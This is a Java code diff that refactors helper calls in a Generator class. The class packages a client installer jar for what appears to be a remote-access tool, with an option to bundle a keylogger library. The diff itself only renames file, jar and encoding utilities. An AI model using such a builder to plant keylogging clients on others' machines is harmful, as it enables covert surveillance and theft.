@@ -32,14 +32,17 @@ import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.proto.Misc.AuthType;
 import com.subterranean_security.crimson.core.storage.ClientDB;
-import com.subterranean_security.crimson.core.util.B64;
-import com.subterranean_security.crimson.core.util.CUtil;
+import com.subterranean_security.crimson.core.util.B64Util;
+import com.subterranean_security.crimson.core.util.FileUtil;
+import com.subterranean_security.crimson.core.util.JarUtil;
+import com.subterranean_security.crimson.core.util.JavaLibraries;
+import com.subterranean_security.crimson.core.util.TempUtil;
 
 public class Generator {
 
 	private static final Logger log = LoggerFactory.getLogger(Generator.class);
 
-	private File temp = CUtil.Files.Temp.getDir();
+	private File temp = TempUtil.getDir();
 	private GenReport.Builder report = GenReport.newBuilder();
 
 	public GenReport getReport() {
@@ -73,8 +76,8 @@ public class Generator {
 	}
 
 	public byte[] getResult() throws IOException {
-		byte[] result = CUtil.Files.readFile(new File(temp.getAbsolutePath() + "/installer.jar"));
-		CUtil.Files.delete(temp);
+		byte[] result = FileUtil.readFile(new File(temp.getAbsolutePath() + "/installer.jar"));
+		FileUtil.delete(temp);
 		return result;
 	}
 
@@ -91,7 +94,7 @@ public class Generator {
 		try {
 			ClientDB database = new ClientDB(clientDB);
 			database.storeObject("cvid", cvid);
-			database.storeObject("ic", new String(B64.encode(ic.toByteArray())));
+			database.storeObject("ic", new String(B64Util.encode(ic.toByteArray())));
 			if (ic.getAuthType() == AuthType.GROUP) {
 				database.storeObject("auth.group", ServerStore.Authentication.getGroup(ic.getGroupName()));
 			}
@@ -105,7 +108,7 @@ public class Generator {
 		}
 
 		// copy the client jar out
-		CUtil.Files.extract("com/subterranean_security/crimson/server/res/bin/client.jar", clientJar.getAbsolutePath());
+		JarUtil.extract("com/subterranean_security/crimson/server/res/bin/client.jar", clientJar.getAbsolutePath());
 
 		// add client database to jar
 		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/res/bin/client.db", clientDB);
@@ -116,11 +119,11 @@ public class Generator {
 		new File(tmpZip.getAbsolutePath() + "/java").mkdirs();
 
 		// add jar files
-		for (String lib : CUtil.JavaLibraries.getRequisites(Instance.CLIENT)) {
+		for (String lib : JavaLibraries.getRequisites(Instance.CLIENT)) {
 			if (lib.equals("c19") && !ic.getKeylogger()) {
 				continue;
 			}
-			CUtil.Files.copyFile(new File(Common.Directories.base.getAbsolutePath() + "/lib/java/" + lib + ".jar"),
+			FileUtil.copy(new File(Common.Directories.base.getAbsolutePath() + "/lib/java/" + lib + ".jar"),
 					new File(tmpZip.getAbsolutePath() + "/java/" + lib + ".jar"));
 
 		}
@@ -130,7 +133,7 @@ public class Generator {
 			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/win");
 			jniOut.mkdirs();
 			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/win").listFiles()) {
-				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
+				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
 			}
 
 		}
@@ -138,28 +141,28 @@ public class Generator {
 			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/lin");
 			jniOut.mkdirs();
 			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/lin").listFiles()) {
-				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
+				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
 			}
 		}
 		if (ic.hasPathOsx()) {
 			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/osx");
 			jniOut.mkdirs();
 			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/osx").listFiles()) {
-				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
+				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
 			}
 		}
 		if (ic.hasPathSol()) {
 			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/sol");
 			jniOut.mkdirs();
 			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/sol").listFiles()) {
-				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
+				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
 			}
 		}
 		if (ic.hasPathBsd()) {
 			File jniOut = new File(tmpZip.getAbsolutePath() + "/jni/bsd");
 			jniOut.mkdirs();
 			for (File f : new File(Common.Directories.base.getAbsolutePath() + "/lib/jni/bsd").listFiles()) {
-				CUtil.Files.copyFile(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
+				FileUtil.copy(f, new File(jniOut.getAbsolutePath() + "/" + f.getName()));
 			}
 		}
 
@@ -169,7 +172,7 @@ public class Generator {
 		// create and add the internal.txt
 		internal.createNewFile();
 		PrintWriter pw = new PrintWriter(internal);
-		pw.println(B64.encode(ic.toByteArray()));
+		pw.println(B64Util.encode(ic.toByteArray()));
 		pw.close();
 
 		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/internal.txt", internal);
@@ -177,8 +180,8 @@ public class Generator {
 		// delete jars
 		// CUtil.Files.delete(clientJar);
 
-		gReport.setHashMd5(CUtil.Files.getHash(clientJar.getAbsolutePath(), "MD5"));
-		gReport.setHashSha256(CUtil.Files.getHash(clientJar.getAbsolutePath(), "SHA-256"));
+		gReport.setHashMd5(FileUtil.getHash(clientJar.getAbsolutePath(), "MD5"));
+		gReport.setHashSha256(FileUtil.getHash(clientJar.getAbsolutePath(), "SHA-256"));
 		gReport.setFileSize((int) clientJar.length());
 		gReport.setResult(true);
 		gReport.setGenTime((int) (new Date().getTime() - start.getTime()));
